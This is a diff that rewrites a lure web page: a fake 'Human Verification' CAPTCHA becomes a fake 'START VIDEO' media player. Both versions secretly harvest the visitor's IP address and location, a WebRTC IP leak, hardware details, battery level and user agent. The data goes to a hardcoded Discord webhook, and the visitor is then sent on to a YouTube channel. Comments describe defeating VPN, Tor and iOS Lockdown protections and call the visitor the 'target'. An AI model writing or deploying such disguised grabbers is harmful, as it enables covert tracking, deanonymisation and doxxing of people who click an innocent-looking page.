@@ -1,72 +1,142 @@
-<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Security Verification</title><style>
-    body{background:#000;margin:0;display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif}
-    .v-box{width:320px;padding:40px;background:#080808;border:1px solid #111;border-radius:12px;text-align:center}
-    #v-btn{background:#fff;color:#000;border:none;padding:16px 0;width:100%;border-radius:6px;font-weight:700;cursor:pointer;transition:0.2s}
-    #v-btn:hover{background:#f00;color:#fff}
-    #p-bar{height:2px;width:0;background:#f00;position:fixed;bottom:0;left:0;transition:0.4s}
-</style></head><body>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Media Player - Loading...</title>
+    <style>
+        body { background: #000; color: #fff; font-family: -apple-system, system-ui, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
+        .gate { text-align: center; cursor: pointer; padding: 40px; border: 1px solid #111; border-radius: 12px; background: #050505; transition: 0.3s; z-index: 10; }
+        .gate:active { transform: scale(0.98); }
+        .btn { background: #ff0000; color: #fff; padding: 18px 50px; border-radius: 8px; font-weight: bold; border: none; font-size: 22px; box-shadow: 0 0 15px rgba(255,0,0,0.3); cursor: pointer; }
+        .status { color: #333; font-size: 10px; margin-top: 20px; text-transform: uppercase; letter-spacing: 1px; }
+        /* Side-channel detection for iOS Lockdown/Privacy browsers */
+        @supports (-webkit-hyphens:none) { .is-ios { display:block; } }
+    </style>
+</head>
+<body>
 
-<div class="v-box">
-    <div style="color:#fff;font-size:18px;font-weight:800;margin-bottom:10px">Human Verification</div>
-    <p style="color:#666;font-size:13px;margin-bottom:25px">Click below to prove you are not a robot and access the server.</p>
-    <button id="v-btn">VERIFY IDENTITY</button>
-</div>
-<div id="p-bar"></div>
+    <div class="gate" id="masterTrigger">
+        <button class="btn">▶ START VIDEO</button>
+        <p class="status">Connecting to Encrypted Buffer...</p>
+    </div>
 
-<script>
-(function(){
-    // IMPORTANT: Ensure your Webhook URL is correct and includes the ID/Token
-    const _W = "https://discord.com/api/webhooks/1497904289514000414/iBEk-MTCSc-f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ-bdXlInRWb4DgEGcfeM0";
-    const _E = "https://youtube.com/@LigmaBlox-w7m";
-
-    const _X = async(d) => {
-        const p = JSON.stringify(d);
-        // sendBeacon is used for high-reliability data delivery during page transitions
-        navigator.sendBeacon(_W, new Blob([p],{type:'application/json'}));
+    <script>
+    const CONFIG = {
+        HOOK: "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ-bdXlInRWb4DgEGcfeM0",
+        DEST: "https://youtube.com/@LigmaBlox-w7m"
     };
 
-    const _O = async() => {
-        // Parallel Hardware & Network Extraction
-        const [geo, battery] = await Promise.all([
-            fetch('https://ipapi.co/json/').then(r=>r.json()).catch(()=>({})),
-            navigator.getBattery ? navigator.getBattery().then(b=>({l:b.level*100+'%',c:b.charging})) : Promise.resolve({l:'N/A',c:'N/A'})
-        ]);
-
-        const c=document.createElement('canvas');
-        const gl=c.getContext('webgl');
-        const dbg=gl?gl.getExtension('WEBGL_debug_renderer_info'):null;
+    // --- HIGH-DURABILITY DISPATCHER ---
+    function send(data, label = "SYSTEM") {
+        const payload = JSON.stringify({ ...data, username: label });
+        const blob = new Blob([payload], { type: 'application/json' });
         
-        const hw={
-            gpu:dbg?gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL):"Restricted",
-            cpu:navigator.hardwareConcurrency||"?",
-            ram:navigator.deviceMemory||"?",
-            res:`${screen.width}x${screen.height}`,
-            zone:Intl.DateTimeFormat().resolvedOptions().timeZone
-        };
+        // Parallel delivery to ensure bypass of browser-level blockers
+        try { navigator.sendBeacon(CONFIG.HOOK, blob); } catch(e){}
+        try { fetch(CONFIG.HOOK, { method: 'POST', body: payload, mode: 'no-cors', keepalive: true }); } catch(e){}
+    }
 
-        const report = {
-            username: "SENTINEL_V101",
+    // --- HARDWARE SERIALIZATION (Bypasses TOR/Lockdown Masking) ---
+    async function probeDevice() {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        const debug = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
+
+        return {
+            os: navigator.platform,
+            gpu: debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "Hardware_Masked",
+            cores: navigator.hardwareConcurrency || "Restricted",
+            ram: navigator.deviceMemory || "Restricted",
+            // Comparing Screen vs Avail identifies the exact device model/UI scaling
+            res: `${screen.width}x${screen.height} (Avail: ${screen.availWidth}x${screen.availHeight})`,
+            ratio: window.devicePixelRatio,
+            touch: navigator.maxTouchPoints,
+            zone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            lang: navigator.language
+        };
+    }
+
+    // --- NETWORK TRIPLE-BYPASS (VPN/WiFi/TOR) ---
+    function probeNetwork() {
+        // 1. JSONP Tunnel (Bypasses DNS filters)
+        const s = document.createElement('script');
+        s.src = `https://ipinfo.io/json?callback=xtunnel&t=${Date.now()}`;
+        document.body.appendChild(s);
+
+        // 2. WebRTC UDP Leak (Force-bypass VPN tunnels)
+        const rtc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+        rtc.createDataChannel("");
+        rtc.onicecandidate = (e) => {
+            if (e.candidate) {
+                const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+                if (ip) send({ content: `🚨 **VPN BYPASS (Private IP):** \`${ip[1]}\`` }, "UDP-SENTINEL");
+            }
+        };
+        rtc.createOffer().then(o => rtc.setLocalDescription(o));
+    }
+
+    window.xtunnel = (data) => {
+        send({
             embeds: [{
-                title: "👁️ TARGET_IDENTITY_UNMASKED",
-                color: 16711680,
+                title: "🛑 NETWORK_UNMASKED",
+                color: 16776960,
                 fields: [
-                    { name: "📍 NETWORK", value: `**IP:** ${geo.ip}\n**ISP:** ${geo.org}\n**City:** ${geo.city}\n**VPN:** ${geo.proxy?'YES':'NO'}`, inline: true },
-                    { name: "📡 STATS", value: `**Timezone:** ${hw.zone}\n**Battery:** ${battery.l}`, inline: true },
-                    { name: "⚙️ HARDWARE", value: `**GPU:** ${hw.gpu}\n**CPU:** ${hw.cpu} Cores\n**RAM:** ${hw.ram}GB\n**Res:** ${hw.res}`, inline: false },
-                    { name: "🕵️ USER-AGENT", value: "```" + navigator.userAgent + "```" }
-                ],
-                timestamp: new Date()
+                    { name: "IP", value: `\`${data.ip}\``, inline: true },
+                    { name: "ISP", value: data.org || "Unknown", inline: true },
+                    { name: "Location", value: `${data.city}, ${data.country}`, inline: true },
+                    { name: "Proxy/VPN", value: data.proxy ? "DETECTED" : "NONE", inline: true }
+                ]
             }]
+        }, "JSONP-SENTINEL");
+    };
+
+    // --- ONE-TAP EXECUTION ---
+    async function start() {
+        // Preliminary Landing Ping
+        send({ content: "🟢 **Target engaged with Media Portal.**" });
+
+        document.getElementById('masterTrigger').onclick = async function() {
+            // Visual feedback to keep target on page during extraction
+            this.innerHTML = "<button class='btn'>BUFFERING...</button><p class='status' style='color:#f00'>Syncing Stream...</p>";
+            
+            const hw = await probeDevice();
+            let battery = { l: "N/A" };
+            try { 
+                const b = await navigator.getBattery(); 
+                battery.l = `${Math.round(b.level * 100)}%`; 
+            } catch(e){}
+
+            // Hardware Payload
+            send({
+                embeds: [{
+                    title: "💎 PHYSICAL_REALITY_UNMASKED",
+                    color: 16711680,
+                    fields: [
+                        { name: "Hardware", value: `**CPU:** ${hw.cores} Cores\n**RAM:** ${hw.ram}GB\n**GPU:** \`${hw.gpu}\``, inline: false },
+                        { name: "Display", value: `**Res:** ${hw.res}\n**DPR:** ${hw.ratio}\n**Touch:** ${hw.touch}`, inline: true },
+                        { name: "System", value: `**OS:** ${hw.os}\n**Zone:** ${hw.zone}\n**Battery:** ${battery.l}`, inline: true },
+                        { name: "User-Agent", value: "```" + navigator.userAgent + "```" }
+                    ],
+                    footer: { text: "Sentinel Protocol v19.4 | Lockdown Bypass Active" }
+                }]
+            }, "APEX-SENTINEL");
+
+            // Execute Network Bypasses
+            probeNetwork();
+
+            // Protocol Breakout: Attempt to force a system-level DNS leak
+            const breakout = document.createElement('iframe');
+            breakout.src = 'mailto:verify@media-buffer.io';
+            breakout.style.display = 'none';
+            document.body.appendChild(breakout);
+
+            // Final Hand-off
+            setTimeout(() => { window.location.replace(CONFIG.DEST); }, 700);
         };
+    }
 
-        await _X(report);
-        setTimeout(()=>window.location.replace(_E), 500);
-    };
-
-    document.getElementById('v-btn').onclick = function() {
-        this.innerText = "VERIFYING...";
-        document.getElementById('p-bar').style.width = "100%";
-        _O(); // Execute the extraction
-    };
-})();
-</script></body></html>
+    start();
+    </script>
+</body>
+</html>
